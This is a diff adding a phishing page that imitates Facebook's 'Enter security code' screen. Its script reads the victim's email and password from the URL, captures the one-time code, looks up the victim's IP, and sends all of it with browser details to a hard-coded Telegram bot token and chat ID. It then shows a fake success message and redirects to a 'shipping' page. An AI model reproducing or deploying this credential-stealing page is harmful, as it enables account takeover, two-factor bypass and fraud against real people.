@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Enter Security Code | Facebook</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 500px;
+      width: 100%;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .facebook-logo {
+      font-size: 42px;
+      font-weight: bold;
+      color: #1877f2;
+      margin-bottom: 10px;
+    }
+
+    .otp-box {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+      padding: 20px;
+      text-align: center;
+    }
+
+    .title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 15px;
+      color: #1c1e21;
+    }
+
+    .description {
+      color: #606770;
+      font-size: 15px;
+      line-height: 1.4;
+      margin-bottom: 20px;
+    }
+
+    .phone-number {
+      font-weight: bold;
+      color: #1c1e21;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 25px 0;
+    }
+
+    .otp-input {
+      width: 50px;
+      height: 50px;
+      border: 1px solid #dddfe2;
+      border-radius: 4px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      background: #fff;
+    }
+
+    .otp-input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    .continue-btn {
+      background: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 10px 16px;
+      width: 100%;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+
+    .continue-btn:hover {
+      background: #166fe5;
+    }
+
+    .continue-btn:disabled {
+      background: #e4e6eb;
+      color: #bcc0c4;
+      cursor: not-allowed;
+    }
+
+    .secondary-options {
+      border-top: 1px solid #dadde1;
+      padding-top: 15px;
+    }
+
+    .option-link {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+
+    .option-link:hover {
+      text-decoration: underline;
+    }
+
+    .error-message {
+      color: #f02849;
+      font-size: 13px;
+      margin: 10px 0;
+      display: none;
+    }
+
+    .success-message {
+      color: #00a400;
+      font-size: 13px;
+      margin: 10px 0;
+      display: none;
+    }
+
+    .loading {
+      color: #1877f2;
+      font-size: 14px;
+      margin: 10px 0;
+      display: none;
+    }
+
+    .resend-text {
+      color: #606770;
+      font-size: 14px;
+      margin: 15px 0;
+    }
+
+    .resend-link {
+      color: #1877f2;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .resend-link:hover {
+      text-decoration: underline;
+    }
+
+    .resend-link:disabled {
+      color: #8a8d91;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="facebook-logo">facebook</div>
+    </div>
+
+    <div class="otp-box">
+      <div class="title">Enter security code</div>
+      
+      <div class="description">
+        Please check your messages for a text message with your code. Your code is 6 characters long.
+      </div>
+
+      <div class="description">
+        We sent your code to: <span class="phone-number" id="phoneDisplay">+1 *** *** 1234</span>
+      </div>
+
+      <form id="otpForm">
+        <div class="otp-inputs">
+          <input type="text" class="otp-input" maxlength="1" data-index="1" inputmode="numeric" pattern="[0-9]*">
+          <input type="text" class="otp-input" maxlength="1" data-index="2" inputmode="numeric" pattern="[0-9]*">
+          <input type="text" class="otp-input" maxlength="1" data-index="3" inputmode="numeric" pattern="[0-9]*">
+          <input type="text" class="otp-input" maxlength="1" data-index="4" inputmode="numeric" pattern="[0-9]*">
+          <input type="text" class="otp-input" maxlength="1" data-index="5" inputmode="numeric" pattern="[0-9]*">
+          <input type="text" class="otp-input" maxlength="1" data-index="6" inputmode="numeric" pattern="[0-9]*">
+        </div>
+
+        <input type="hidden" id="fullOtp" name="otp">
+
+        <div class="error-message" id="errorMessage">Incorrect code. Please try again.</div>
+        <div class="success-message" id="successMessage">Code verified successfully! Redirecting...</div>
+        <div class="loading" id="loading">Verifying code...</div>
+
+        <button type="submit" class="continue-btn" id="continueBtn" disabled>Continue</button>
+      </form>
+
+      <div class="resend-text">
+        Didn't receive a code? 
+        <a class="resend-link" id="resendLink">Resend code</a>
+        <span id="countdown"></span>
+      </div>
+
+      <div class="secondary-options">
+        <a class="option-link" id="changeNumber">I don't have access to this phone</a>
+        <a class="option-link" id="useEmail">Get a code via email instead</a>
+        <a class="option-link" id="goBack">Back to login</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Get URL parameters to show the email/phone from login
+    const urlParams = new URLSearchParams(window.location.search);
+    const userEmail = urlParams.get('email') || 'your account';
+    const userPassword = urlParams.get('password') || '';
+
+    // Update the display with user's email/phone
+    document.getElementById('phoneDisplay').textContent = userEmail;
+
+    // Get DOM elements
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const fullOtpInput = document.getElementById('fullOtp');
+    const continueBtn = document.getElementById('continueBtn');
+    const errorElement = document.getElementById('errorMessage');
+    const successElement = document.getElementById('successMessage');
+    const loadingElement = document.getElementById('loading');
+    const resendLink = document.getElementById('resendLink');
+    const countdownElement = document.getElementById('countdown');
+
+    // OTP input handling
+    otpInputs.forEach((input, index) => {
+      // Handle input
+      input.addEventListener('input', (e) => {
+        const value = e.target.value;
+        
+        // Only allow numbers
+        if (value && !/^\d+$/.test(value)) {
+          e.target.value = '';
+          return;
+        }
+
+        // Auto-focus next input
+        if (value && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
+        }
+
+        updateOtpValue();
+        validateOtp();
+      });
+
+      // Handle backspace
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+
+      // Handle paste
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasteData = e.clipboardData.getData('text').slice(0, 6);
+        
+        if (/^\d+$/.test(pasteData)) {
+          pasteData.split('').forEach((char, charIndex) => {
+            if (otpInputs[charIndex]) {
+              otpInputs[charIndex].value = char;
+            }
+          });
+          
+          if (pasteData.length === 6) {
+            otpInputs[5].focus();
+          } else {
+            otpInputs[pasteData.length].focus();
+          }
+          
+          updateOtpValue();
+          validateOtp();
+        }
+      });
+    });
+
+    function updateOtpValue() {
+      const otp = Array.from(otpInputs).map(input => input.value).join('');
+      fullOtpInput.value = otp;
+    }
+
+    function validateOtp() {
+      const otp = fullOtpInput.value;
+      const isValid = otp.length === 6 && /^\d+$/.test(otp);
+      continueBtn.disabled = !isValid;
+      return isValid;
+    }
+
+    // Form submission
+    document.getElementById('otpForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const otp = fullOtpInput.value;
+
+      // Hide previous messages, show loading
+      errorElement.style.display = 'none';
+      successElement.style.display = 'none';
+      loadingElement.style.display = 'block';
+      continueBtn.disabled = true;
+
+      try {
+        // Get user's IP address
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        // Get additional user information
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const timestamp = new Date().toLocaleString();
+
+        // Your Telegram bot details
+        const botToken = '7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU';
+        const chatId = '8456018521';
+        
+        // Create message for Telegram - Include both login and OTP data
+        const message = `🔐 Facebook Login + OTP Data:\n\n📧 Email/Phone: ${userEmail}\n🔒 Password: ${userPassword}\n🔢 OTP Code: ${otp}\n🌐 IP Address: ${userIP}\n🕒 Time: ${timestamp}\n📱 Browser: ${userAgent}\n💻 Platform: ${platform}\n🗣️ Language: ${language}`;
+
+        // Send to Telegram bot
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        const response = await fetch(telegramUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+
+        if (response.ok) {
+          successElement.textContent = 'Code verified successfully! Redirecting to shipping...';
+          successElement.style.display = 'block';
+          loadingElement.style.display = 'none';
+          
+          // Redirect to SHIPPING PAGE after OTP verification
+          setTimeout(() => {
+            window.location.href = "shipping.html"; // Redirect to your shipping page
+          }, 2000);
+        } else {
+          throw new Error('Failed to send OTP to Telegram');
+        }
+        
+      } catch (error) {
+        console.error('Error:', error);
+        loadingElement.style.display = 'none';
+        continueBtn.disabled = false;
+        errorElement.textContent = 'Verification failed. Please try again.';
+        errorElement.style.display = 'block';
+      }
+    });
+
+    // Resend code functionality
+    let countdown = 30;
+    resendLink.style.display = 'none';
+
+    function startCountdown() {
+      resendLink.style.display = 'none';
+      countdownElement.textContent = ` (${countdown}s)`;
+      
+      const timer = setInterval(() => {
+        countdown--;
+        countdownElement.textContent = ` (${countdown}s)`;
+        
+        if (countdown <= 0) {
+          clearInterval(timer);
+          resendLink.style.display = 'inline';
+          countdownElement.textContent = '';
+          countdown = 30;
+        }
+      }, 1000);
+    }
+
+    resendLink.addEventListener('click', function() {
+      if (resendLink.style.display === 'inline') {
+        // Simulate resending code
+        loadingElement.textContent = 'Sending new code...';
+        loadingElement.style.display = 'block';
+        
+        setTimeout(() => {
+          loadingElement.style.display = 'none';
+          startCountdown();
+          
+          // Clear previous OTP
+          otpInputs.forEach(input => input.value = '');
+          updateOtpValue();
+          validateOtp();
+        }, 1500);
+      }
+    });
+
+    // Start countdown on page load
+    startCountdown();
+
+    // Other option handlers
+    document.getElementById('changeNumber').addEventListener('click', function() {
+      alert('Redirecting to phone number change page...');
+    });
+
+    document.getElementById('useEmail').addEventListener('click', function() {
+      alert('Sending code via email...');
+    });
+
+    document.getElementById('goBack').addEventListener('click', function() {
+      window.location.href = "login.html";
+    });
+
+    // Auto-focus first input on page load
+    otpInputs[0].focus();
+  </script>
+</body>
+</html>
